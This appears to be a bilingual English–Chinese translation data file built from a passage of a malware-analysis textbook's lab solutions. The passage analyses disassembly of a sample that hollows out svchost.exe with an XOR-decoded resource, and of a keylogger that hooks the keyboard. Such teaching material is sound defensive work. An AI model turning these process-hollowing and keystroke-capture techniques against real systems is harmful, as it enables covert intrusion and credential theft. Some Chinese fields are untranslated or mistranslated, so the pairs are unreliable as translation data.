  type: TYPE_NORMAL
  zh: '; CODE XREF: sub_4010EA+1CD_j'
- en: 00401260 mov eax, [ebp+var_70]
  id: totrans-3720
  prefs: []
  type: TYPE_NORMAL
  zh: 00401260 mov eax, [ebp+var_70]
- en: 00401263 add eax, 1
  id: totrans-3721
  prefs: []
  type: TYPE_NORMAL
  zh: 00401263 add eax, 1
- en: 00401266 mov [ebp+var_70], eax
  id: totrans-3722
  prefs: []
  type: TYPE_NORMAL
  zh: 00401266 mov [ebp+var_70], eax
- en: 00401269
  id: totrans-3723
  prefs: []
  type: TYPE_NORMAL
  zh: 00401269
- en: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
  id: totrans-3724
  prefs: []
  type: TYPE_NORMAL
  zh: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
- en: 0040126C xor edx, edx
  id: totrans-3725
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126C xor edx, edx
- en: 0040126E mov dx,[ecx+**IMAGE_NT_HEADERS.FileHeader.NumberOfSections**]
  id: totrans-3726
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126E mov dx,[ecx+**IMAGE_NT_HEADERS.FileHeader.NumberOfSections**]
- en: 00401272 cmp [ebp+var_70], edx
  id: totrans-3727
  prefs: []
  type: TYPE_NORMAL
  zh: 00401272 cmp [ebp+var_70], edx
- en: 00401275 jge short loc_4012B9
  id: totrans-3728
  prefs: []
  type: TYPE_NORMAL
  zh: 00401275 jge short loc_4012B9
- en: 00401277 mov eax, [ebp+var_4]
  id: totrans-3729
  prefs: []
  type: TYPE_NORMAL
  zh: 00401277 mov eax, [ebp+var_4]
- en: 0040127A mov ecx, [ebp+lpBuffer]
  id: totrans-3730
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127A mov ecx, [ebp+lpBuffer]
- en: 0040127D add ecx, [eax+**IMAGE_DOS_HEADER.e_lfanew**]
  id: totrans-3731
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127D add ecx, [eax+**IMAGE_DOS_HEADER.e_lfanew**]
- en: 00401280 mov edx, [ebp+var_70]
  id: totrans-3732
  prefs: []
  type: TYPE_NORMAL
  zh: 00401280 mov edx, [ebp+var_70]
- en: 00401283 imul edx, 28h
  id: totrans-3733
  prefs: []
  type: TYPE_NORMAL
  zh: 00401283 imul edx, 28h
- en: 00401286 lea eax, [ecx+edx+(**size IMAGE_NT_HEADERS**)]
  id: totrans-3734
  prefs: []
  type: TYPE_NORMAL
  zh: 00401286 lea eax, [ecx+edx+(**size IMAGE_NT_HEADERS**)]
- en: 0040128D mov [ebp+var_74], eax
  id: totrans-3735
  prefs: []
  type: TYPE_NORMAL
  zh: 0040128D mov [ebp+var_74], eax
- en: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
  id: totrans-3736
  prefs: []
  type: TYPE_NORMAL
  zh: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
- en: 00401295 mov edx, [ecx+**IMAGE_SECTION_HEADER.SizeOfRawData**]
  id: totrans-3737
  prefs: []
  type: TYPE_NORMAL
  zh: 00401295 mov edx, [ecx+**IMAGE_SECTION_HEADER.SizeOfRawData**]
- en: 00401298 push edx ; nSize
  id: totrans-3738
  prefs: []
  type: TYPE_NORMAL
  zh: 00401298 push edx ; nSize
- en: 00401299 mov eax, [ebp+var_74]
  id: totrans-3739
  prefs: []
  type: TYPE_NORMAL
  zh: 00401299 mov eax, [ebp+var_74]
- en: 0040129C mov ecx, [ebp+lpBuffer]
  id: totrans-3740
  prefs: []
  type: TYPE_NORMAL
  zh: 0040129C mov ecx, [ebp+lpBuffer]
- en: 0040129F add ecx, [eax+**IMAGE_SECTION_HEADER.PointerToRawData**]
  id: totrans-3741
  prefs: []
  type: TYPE_NORMAL
  zh: 0040129F add ecx, [eax+**IMAGE_SECTION_HEADER.PointerToRawData**]
- en: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
  id: totrans-3742
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
- en: 004012A6 mov eax, [ebp+lpBaseAddress]
  id: totrans-3743
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A6 mov eax, [ebp+lpBaseAddress]
- en: 004012A9 add eax, [edx+**IMAGE_SECTION_HEADER.VirtualAddress**]
  id: totrans-3744
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A9 add eax, [edx+**IMAGE_SECTION_HEADER.VirtualAddress**]
- en: '**594**'
  id: totrans-3745
  prefs: []
  type: TYPE_NORMAL
  zh: '**594**'
- en: Appendix C
  id: totrans-3746
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3747
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
  id: totrans-3748
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
- en: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
  id: totrans-3749
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
- en: 004012B7 jmp short loc_401260
  id: totrans-3750
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B7 jmp short loc_401260
- en: '*Listing 12-10L: Copying PE sections into memory using IDA Pro structures*
    In Listing 12-10L, it’s much easier to see that the SizeOfRawData, PointerToRawData,
    and VirtualAddress values of each section header are being used to perform the
    copy operations, confirming our earlier suspicion that the program copies each
    section into the suspended process’s memory space. The program has taken the necessary
    steps to load an executable into another process’s address space.'
  id: totrans-3751
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-10L：使用 IDA Pro 结构将 PE 部分复制到内存中* 在列表 12-10L 中，我们可以更清楚地看到，每个部分标题的 SizeOfRawData、PointerToRawData
    和 VirtualAddress 值被用于执行复制操作，证实了我们之前的怀疑，即程序将每个部分复制到挂起进程的内存空间中。程序已经采取了必要的步骤将可执行文件加载到另一个进程的地址空间中。'
- en: In Listing 12-11L, we see that the program uses SetThreadContext, which sets
    the EAX register at  to the entry point of the executable that was just loaded
    into the suspended process’s memory space. Once the program performs the ResumeThread
    at , it will have successfully achieved process replacement on the process created
    using CreateProcessA at the beginning of this function.
  id: totrans-3752
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 12-11L 中，我们看到程序使用了 SetThreadContext，它将 EAX 寄存器设置为刚加载到挂起进程内存空间的可执行文件的入口点。一旦程序执行了
    ResumeThread，它就成功实现了使用 CreateProcessA 在函数开头创建的进程的进程替换。
- en: 004012DB
  id: totrans-3753
  prefs: []
  type: TYPE_NORMAL
  zh: 004012DB
- en: mov
  id: totrans-3754
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: eax, [ebp+var_8]
  id: totrans-3755
  prefs: []
  type: TYPE_NORMAL
  zh: eax, [ebp+var_8]
- en: 004012DE
  id: totrans-3756
  prefs: []
  type: TYPE_NORMAL
  zh: 004012DE
- en: mov
  id: totrans-3757
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: ecx, [ebp+lpBaseAddress]
  id: totrans-3758
  prefs: []
  type: TYPE_NORMAL
  zh: ecx, [ebp+lpBaseAddress]
- en: 004012E1
  id: totrans-3759
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E1
- en: add
  id: totrans-3760
  prefs: []
  type: TYPE_NORMAL
  zh: add
- en: ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
  id: totrans-3761
  prefs: []
  type: TYPE_NORMAL
  zh: ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
- en: '**1 2**'
  id: totrans-3762
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: 004012E4
  id: totrans-3763
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E4
- en: mov
  id: totrans-3764
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: edx, [ebp+lpContext]
  id: totrans-3765
  prefs: []
  type: TYPE_NORMAL
  zh: edx, [ebp+lpContext]
- en: 004012E7
  id: totrans-3766
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E7
- en: mov
  id: totrans-3767
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: '[edx+CONTEXT._Eax], ecx '
  id: totrans-3768
  prefs: []
  type: TYPE_NORMAL
  zh: '[edx+CONTEXT._Eax], ecx '
- en: 004012ED
  id: totrans-3769
  prefs: []
  type: TYPE_NORMAL
  zh: 004012ED
- en: mov
  id: totrans-3770
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: eax, [ebp+lpContext]
  id: totrans-3771
  prefs: []
  type: TYPE_NORMAL
  zh: eax, [ebp+lpContext]
- en: 004012F0
  id: totrans-3772
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F0
- en: push
  id: totrans-3773
  prefs: []
  type: TYPE_NORMAL
  zh: push
- en: eax ; lpContext
  id: totrans-3774
  prefs: []
  type: TYPE_NORMAL
  zh: eax ; lpContext
- en: 004012F1
  id: totrans-3775
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F1
- en: mov
  id: totrans-3776
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: ecx, [ebp+ProcessInformation.hThread]
  id: totrans-3777
  prefs: []
  type: TYPE_NORMAL
  zh: ecx, [ebp+ProcessInformation.hThread]
- en: 004012F4
  id: totrans-3778
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F4
- en: push
  id: totrans-3779
  prefs: []
  type: TYPE_NORMAL
  zh: push
- en: ecx ; hThread
  id: totrans-3780
  prefs: []
  type: TYPE_NORMAL
  zh: ecx ; hThread
- en: 004012F5
  id: totrans-3781
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F5
- en: call
  id: totrans-3782
  prefs: []
  type: TYPE_NORMAL
  zh: call
- en: ds:**SetThreadContext**
  id: totrans-3783
  prefs: []
  type: TYPE_NORMAL
  zh: ds:**SetThreadContext**
- en: 004012FB
  id: totrans-3784
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FB
- en: mov
  id: totrans-3785
  prefs: []
  type: TYPE_NORMAL
  zh: mov
- en: edx, [ebp+ProcessInformation.hThread]
  id: totrans-3786
  prefs: []
  type: TYPE_NORMAL
  zh: edx, [ebp+ProcessInformation.hThread]
- en: 004012FE
  id: totrans-3787
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FE
- en: push
  id: totrans-3788
  prefs: []
  type: TYPE_NORMAL
  zh: push
- en: edx ; hThread
  id: totrans-3789
  prefs: []
  type: TYPE_NORMAL
  zh: edx ; hThread
- en: 004012FF
  id: totrans-3790
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FF
- en: call
  id: totrans-3791
  prefs: []
  type: TYPE_NORMAL
  zh: call
- en: ds:ResumeThread 
  id: totrans-3792
  prefs: []
  type: TYPE_NORMAL
  zh: ds:ResumeThread 
- en: '*Listing 12-11L: Resuming a suspended process*'
  id: totrans-3793
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 12-11L：恢复挂起的进程*'
- en: Now that we know process replacement is occurring, it’s important to determine
    which process is being replaced and which process is being covertly executed,
    cloaked within another. First, we need to discover the origin of lpApplicationName,
    the label created by IDA Pro seen in Listing 12-6L
  id: totrans-3794
  prefs: []
  type: TYPE_NORMAL
  zh: 既然我们知道正在发生进程替换，那么确定被替换的进程和被暗中执行的进程（隐藏在另一个进程内部）就很重要了。首先，我们需要发现 lpApplicationName
    的来源，这是 IDA Pro 在清单 12-6L 中看到的标签
- en: being provided to the CreateProcessA API call.
  id: totrans-3795
  prefs: []
  type: TYPE_NORMAL
  zh: being provided to the CreateProcessA API call.
- en: Pressing CTRL-X with the cursor at the start of the sub_4010EA function shows
    all cross-references, including the callers sub_40144B and main. Following main
    brings us to 0x00401544, where the variable Dst is loaded into a register to be
    passed to sub_4010EA as the process name for CreateProcessA. Placing the cursor
    over Dst highlights the variable throughout the function, thereby allowing us
    to follow the variable in order to determine its origin.
  id: totrans-3796
  prefs: []
  type: TYPE_NORMAL
  zh: Pressing CTRL-X with the cursor at the start of the sub_4010EA function shows
    all cross-references, including the callers sub_40144B and main. Following main
    brings us to 0x00401544, where the variable Dst is loaded into a register to be
    passed to sub_4010EA as the process name for CreateProcessA. Placing the cursor
    over Dst highlights the variable throughout the function, thereby allowing us
    to follow the variable in order to determine its origin.
- en: The variable is first seen as shown in Listing 12-12L at , as the second parameter
    to sub_40149D.
  id: totrans-3797
  prefs: []
  type: TYPE_NORMAL
  zh: The variable is first seen as shown in Listing 12-12L at , as the second parameter
    to sub_40149D.
- en: Solutions to Labs
  id: totrans-3798
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**595**'
  id: totrans-3799
  prefs: []
  type: TYPE_NORMAL
  zh: '**595**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3800
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401508 push 400h ; uSize 0040150D lea eax, [ebp+Dst] 
  id: totrans-3801
  prefs: []
  type: TYPE_NORMAL
  zh: 00401508 push 400h ; uSize 0040150D lea eax, [ebp+Dst] 
- en: 00401513 push eax ; Str
  id: totrans-3802
  prefs: []
  type: TYPE_NORMAL
  zh: 00401513 push eax ; Str
- en: 00401514 push offset aSvchost_exe  ;
  id: totrans-3803
  prefs: []
  type: TYPE_NORMAL
  zh: 00401514 push offset aSvchost_exe  ;
- en: '"\\svchost.exe"'
  id: totrans-3804
  prefs: []
  type: TYPE_NORMAL
  zh: '"\\svchost.exe"'
- en: 00401519 call sub_40149D
  id: totrans-3805
  prefs: []
  type: TYPE_NORMAL
  zh: 00401519 调用子程序 sub_40149D
- en: '*Listing 12-12L: Building the path string*'
  id: totrans-3806
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 12-12L：构建路径字符串*'
- en: A quick look at sub_40149D shows it to be a simple function that copies
  id: totrans-3807
  prefs: []
  type: TYPE_NORMAL
  zh: 快速查看 sub_40149D 显示它是一个简单的函数，用于复制
- en: '%SystemRoot%\System32\ into the second parameter, and then concatenates the
    first parameter onto the end of that. Since Dst is the second parameter, it receives
    this new path, so we backtrack through to the first parameter of sub_40149D, at
    , which we can see is \\svchost.exe. This tells us that the replaced process
    is *%SystemRoot%\System32\svchost.exe*.'
  id: totrans-3808
  prefs: []
  type: TYPE_NORMAL
  zh: '%SystemRoot%\System32\ 传入第二个参数，然后将第一个参数连接到该路径的末尾。由于 Dst 是第二个参数，它接收这个新路径，因此我们回溯到
    sub_40149D 的第一个参数 ，我们可以看到它是 \\svchost.exe。这告诉我们被替换的进程是 *%SystemRoot%\System32\svchost.exe*。'
- en: Now we know that the program is starting *svchost.exe*, but we still need to
    determine the process that is replacing *svchost.exe*. To do so, we follow the
    PE
  id: totrans-3809
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道程序正在启动 *svchost.exe*，但我们仍需确定正在替换 *svchost.exe* 的进程。为此，我们遵循 PE
- en: buffer passed to sub_4010EA by following the variable lpBuffer at 0x00401539,
    just as we backtracked Dst earlier.
  id: totrans-3810
  prefs: []
  type: TYPE_NORMAL
  zh: buffer passed to sub_4010EA by following the variable lpBuffer at 0x00401539,
    just as we backtracked Dst earlier.
- en: We locate lpBuffer, which is receiving EAX at  in Listing 12-13L. By examining
    earlier instructions, we find a function call at . Remembering that EAX is the
    return value for a function, we know the buffer is coming from the function sub_40132C,
    which appears to take the variable hModule, a memory pointer to the program itself,
    *Lab12-02.exe*.
  id: totrans-3811
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在清单 12-13L 中定位到 lpBuffer，它在  处接收 EAX。通过检查前面的指令，我们找到一个函数调用在 。记住 EAX 是函数的返回值，我们知道缓冲区来自
    sub_40132C 函数，该函数似乎接受变量 hModule，这是程序本身的内存指针，*Lab12-02.exe*。
- en: 00401521 mov ecx, [ebp+hModule]
  id: totrans-3812
  prefs: []
  type: TYPE_NORMAL
  zh: 00401521 mov ecx, [ebp+hModule]
- en: 00401527 push ecx ; hModule 00401528 call sub_40132C 
  id: totrans-3813
  prefs: []
  type: TYPE_NORMAL
  zh: 00401527 push ecx ; hModule 00401528 call sub_40132C 
- en: 0040152D add esp, 4
  id: totrans-3814
  prefs: []
  type: TYPE_NORMAL
  zh: 0040152D add esp, 4
- en: 00401530 mov [ebp+lpBuffer], eax 
  id: totrans-3815
  prefs: []
  type: TYPE_NORMAL
  zh: 00401530 mov [ebp+lpBuffer], eax 
- en: '*Listing 12-13L: Loading the executable that replaces* svchost.exe The function
    sub_40132C calls the functions FindResource, LoadResource, LockResource, SizeOfResource,
    VirtualAlloc, and memcpy. The program copies data from the executable’s resource
    section into memory. We’ll use Resource Hacker to view the items in the resource
    section and export them to independent files. Figure 12-3L shows *Lab12-02.exe*
    inside Resource Hacker with an encoded binary in the resource section. We can
    use Resource Hacker to export this binary.'
  id: totrans-3816
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-13L：加载替换 *svchost.exe* 的可执行文件* 函数 sub_40132C 调用了 FindResource、LoadResource、LockResource、SizeOfResource、VirtualAlloc
    和 memcpy 函数。程序将可执行文件资源部分的数据复制到内存中。我们将使用 Resource Hacker 来查看资源部分的项目并将它们导出到独立的文件中。图
    12-3L 显示了 Resource Hacker 中的 *Lab12-02.exe*，其中资源部分包含一个编码的二进制文件。我们可以使用 Resource
    Hacker 来导出这个二进制文件。'
- en: At this point, we need to continue examining the disassembly to determine how
    the executable is decoded. At 0x00401425, we see that the buffer is passed to
    function sub_401000, which looks like an XOR routine. Looking back at the third
    parameter passed to the function at location 0x0040141B, we see 0x41\. Using WinHex,
    we can quickly XOR the entire file exported earlier from Resource Hacker by selecting
    **Edit****Modify Data****XOR** and entering **0x41**. After performing this
    conversion, we have a valid PE executable that is later used to replace an instance
    of *svchost.exe*.
  id: totrans-3817
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一点上，我们需要继续检查反汇编代码以确定可执行文件的解码方式。在 0x00401425 处，我们看到缓冲区被传递到 sub_401000 函数，这看起来像是一个
    XOR 程序。回顾在 0x0040141B 位置传递给函数的第三个参数，我们看到 0x41。使用 WinHex，我们可以快速地通过选择 **编辑****修改数据****XOR**
    并输入 **0x41** 来对之前从 Resource Hacker 导出的整个文件进行 XOR 操作。执行此转换后，我们得到一个有效的 PE 可执行文件，稍后用于替换
    *svchost.exe* 的一个实例。
- en: '**596**'
  id: totrans-3818
  prefs: []
  type: TYPE_NORMAL
  zh: '**596**'
- en: Appendix C
  id: totrans-3819
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3820
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 133](index-630_1.png)'
  id: totrans-3821
  prefs: []
  type: TYPE_IMG
  zh: '![Image 133](index-630_1.png)'
- en: '*Figure 12-3L: Resource Hacker showing an encoded binary in the resource section*
    **NOTE**'
  id: totrans-3822
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 12-3L：Resource Hacker 显示资源部分中的编码二进制文件* **注意**'
- en: '*WinHex is a hex editor available at* http://www.x-ways.net/winhex/ *and the
    free* *trial version is useful for malware analysis. We use it here for illustrative
    purposes, but* *most hex editors can perform a single-byte XOR operation.*'
  id: totrans-3823
  prefs: []
  type: TYPE_NORMAL
  zh: '*WinHex 是一个可用的十六进制编辑器，网址为 http://www.x-ways.net/winhex/，其免费* *试用版对恶意软件分析很有用。我们在这里使用它进行说明，但*
    *大多数十六进制编辑器都可以执行单字节 XOR 操作。*'
- en: We can conclude that this malware decodes a binary from its resource section
    and performs process replacement on *svchost.exe* with the decoded binary.
  id: totrans-3824
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以得出结论，这种恶意软件从其资源部分解码二进制文件，并在 *svchost.exe* 上使用解码的二进制文件执行进程替换。
- en: '**1 2**'
  id: totrans-3825
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: '**Lab 12-3 Solutions**'
  id: totrans-3826
  prefs: []
  type: TYPE_NORMAL
  zh: '**12-3 实验解决方案**'
- en: '***Short Answers***'
  id: totrans-3827
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-3828
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The program is a keylogger.
  id: totrans-3829
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序是一个键盘记录器。
- en: 2\.
  id: totrans-3830
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The program uses hook injection to steal keystrokes.
  id: totrans-3831
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序使用钩子注入来窃取按键。
- en: 3\.
  id: totrans-3832
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The program creates the file *practicalmalwareanalysis.log* to store the keystrokes.
  id: totrans-3833
  prefs: []
  type: TYPE_NORMAL
  zh: 程序创建名为 *practicalmalwareanalysis.log* 的文件来存储按键记录。
- en: '***Detailed Analysis***'
  id: totrans-3834
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Since we’ve already analyzed this binary in the labs for Chapter 3, and it was
    extracted as part of Lab 12-2, let’s begin by opening the file with IDA Pro to
    examine the function imports. The most interesting of the imports is SetWindowsHookExA,
    an API that allows an application to hook or monitor events within Microsoft Windows.
  id: totrans-3835
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们已经在第 3 章的实验中分析了这个二进制文件，并且它作为 Lab 12-2 的一部分被提取出来，让我们首先使用 IDA Pro 打开文件来检查函数导入。其中最有趣的是
    SetWindowsHookExA，这是一个允许应用程序钩子或监控 Microsoft Windows 内部事件的 API。
- en: In Listing 12-14L, we see that SetWindowsHookExA is called from main at .
  id: totrans-3836
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 12-14L 中，我们看到 SetWindowsHookExA 从 main 中被调用 。
- en: The MSDN documentation shows that the first parameter, 0Dh, corresponds to WH_KEYBOARD_LL,
    which enables monitoring of keyboard events using the hook function IDA Pro labeled
    fn at . The program is probably doing something with keystrokes. The fn function
    will receive keystrokes.
  id: totrans-3837
  prefs: []
  type: TYPE_NORMAL
  zh: MSDN 文档显示第一个参数 0Dh 对应于 WH_KEYBOARD_LL，这可以通过 IDA Pro 标记为 fn 的钩子函数 ID 来启用对键盘事件的监控。程序可能正在对按键进行某些操作。fn
    函数将接收按键。
- en: 00401053 push eax ; hmod
  id: totrans-3838
  prefs: []
  type: TYPE_NORMAL
  zh: 00401053 push eax ; hmod
- en: 00401054 push offset fn  ; lpfn
  id: totrans-3839
  prefs: []
  type: TYPE_NORMAL
  zh: 00401054 push offset fn  ; lpfn
- en: 00401059 push 0Dh ; idHook Solutions to Labs
  id: totrans-3840
  prefs: []
  type: TYPE_NORMAL
  zh: 00401059 push 0Dh ; idHook Solutions to Labs
- en: '**597**'
  id: totrans-3841
  prefs: []
  type: TYPE_NORMAL
  zh: '**597**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3842
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040105B call ds:SetWindowsHookExA 
  id: totrans-3843
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105B call ds:SetWindowsHookExA 
- en: 00401061 mov [ebp+hhk], eax
  id: totrans-3844
  prefs: []
  type: TYPE_NORMAL
  zh: 00401061 mov [ebp+hhk], eax
- en: '*Listing 12-14L: SetWindowsHookEx called from main*'
  id: totrans-3845
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-14L：从 main 调用的 SetWindowsHookEx*'
- en: After registering to receive keyboard events, the program calls GetMessageA
    in a loop that starts at 0x00401076\. The program must call GetMessageA; otherwise,
    Windows would not deliver the messages to the process’s hook function.
  id: totrans-3846
  prefs: []
  type: TYPE_NORMAL
  zh: 在注册接收键盘事件后，程序在从0x00401076开始的循环中调用GetMessageA。程序必须调用GetMessageA；否则，Windows不会将消息传递到进程的钩子函数。
- en: The loop runs until it produces an error.
  id: totrans-3847
  prefs: []
  type: TYPE_NORMAL
  zh: 循环运行直到产生错误。
- en: Navigating to the function fn, we begin to see what the program is doing with
    the keystrokes it captures. fn is a generic function with three parameters. It
    has a prototype defined by HOOKPROC. Using the MSDN documentation, we determine
    that WH_KEYBOARD_LL callbacks are actually LowLevelKeyboardProc callbacks. We
    use this information to resolve the parameters to actual data structures, which
    makes our job easier by allowing us to read names rather than numeric offsets.
  id: totrans-3848
  prefs: []
  type: TYPE_NORMAL
  zh: 导航到函数fn，我们开始了解程序对其捕获的按键做了什么。fn是一个具有三个参数的通用函数。它由HOOKPROC定义原型。使用MSDN文档，我们确定WH_KEYBOARD_LL回调实际上是LowLevelKeyboardProc回调。我们使用这些信息来解决参数到实际数据结构，这使得我们的工作更容易，因为我们能够读取名称而不是数字偏移量。
- en: To change the IDA display from offsets to names, put the cursor at 0x00401086
    and press the Y key, and then change lParam’s type to **KBDLLHOOKSTRUCT ***. You
    can now go to 0x4010a4, and hit the T key and select **KBDLLHOOKSTRUCT.vkCode**.
    The references to lParam should now show structure variable names rather than
    numeric offsets. For example, [eax]
  id: totrans-3849
  prefs: []
  type: TYPE_NORMAL
  zh: 要将IDA显示从偏移量更改为名称，请将光标置于0x00401086并按Y键，然后将lParam的类型更改为**KBDLLHOOKSTRUCT**。现在您可以转到0x4010a4，按T键并选择**KBDLLHOOKSTRUCT.vkCode**。对lParam的引用现在应显示结构变量名而不是数字偏移量。例如，[eax]
- en: at 0x004010A4 becomes [eax+KBDLLHOOKSSTRUCT.vkCode], as shown in Listing 12-15L
    at .
  id: totrans-3850
  prefs: []
  type: TYPE_NORMAL
  zh: 在0x004010A4处变为[eax+KBDLLHOOKSSTRUCT.vkCode]，如列表12-15L中的所示。
- en: 0040108F cmp [ebp+wParam], WM_SYSKEYDOWN 
  id: totrans-3851
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108F cmp [ebp+wParam], WM_SYSKEYDOWN 
- en: 00401096 jz short loc_4010A1
  id: totrans-3852
  prefs: []
  type: TYPE_NORMAL
  zh: 00401096 jz short loc_4010A1
- en: 00401098 cmp [ebp+wParam], WM_KEYDOWN 
  id: totrans-3853
  prefs: []
  type: TYPE_NORMAL
  zh: 00401098 cmp [ebp+wParam], WM_KEYDOWN 
- en: 0040109F jnz short loc_4010AF
  id: totrans-3854
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109F jnz short loc_4010AF
- en: 004010A1
  id: totrans-3855
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A1
- en: '004010A1 loc_4010A1: ; CODE XREF: fn+10j 004010A1 mov eax, [ebp+lParam]'
  id: totrans-3856
  prefs: []
  type: TYPE_NORMAL
  zh: '004010A1 loc_4010A1: ; CODE XREF: fn+10j 004010A1 mov eax, [ebp+lParam]'
- en: 004010A4 mov ecx, [eax+KBDLLHOOKSTRUCT.vkCode] 
  id: totrans-3857
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A4 mov ecx, [eax+KBDLLHOOKSTRUCT.vkCode] 
- en: 004010A6 push ecx ; Buffer 004010A7 call **sub_4010C7**
  id: totrans-3858
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A6 push ecx ; Buffer 004010A7 call **sub_4010C7**
- en: '*Listing 12-15L: Hook function*'
  id: totrans-3859
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-15L：钩子函数*'
- en: In Listing 12-15L, we see at  and  that the program checks the type of keypress
    with cmp, in order to process each keypress once. At , the program passes (mov)
    the virtual key code to the function sub_4010C7 shown later in bold.
  id: totrans-3860
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表12-15L中，我们看到在和处，程序使用cmp检查按键的类型，以便一次性处理每个按键。在处，程序将（mov）虚拟键码传递给稍后以粗体显示的函数sub_4010C7。
- en: Examining sub_4010C7, we see that first the program opens a file, *practicalmalwareanalysis.log*.
    After this, the malware calls GetForegroundWindow followed by GetWindowTextA,
    as shown in Listing 12-16L. First, GetForegroundWindow selects the active window
    when the key was pressed, and then it grabs the title of the window using GetWindowTextA.
    This helps the program provide context for where the keystrokes originated.
  id: totrans-3861
  prefs: []
  type: TYPE_NORMAL
  zh: 检查sub_4010C7，我们看到程序首先打开一个文件，*practicalmalwareanalysis.log*。在此之后，恶意软件调用GetForegroundWindow，然后是GetWindowTextA，如列表12-16L所示。首先，GetForegroundWindow在按键时选择活动窗口，然后使用GetWindowTextA获取窗口的标题。这有助于程序提供按键起源的上下文。
- en: 004010E6 push offset FileName ; "practicalmalwareanalysis.log"
  id: totrans-3862
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E6 push offset FileName ; "practicalmalwareanalysis.log"
- en: 004010EB call ds:CreateFileA
  id: totrans-3863
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EB call ds:CreateFileA
- en: '...'
  id: totrans-3864
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '**598**'
  id: totrans-3865
  prefs: []
  type: TYPE_NORMAL
  zh: '**598**'
- en: Appendix C
  id: totrans-3866
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
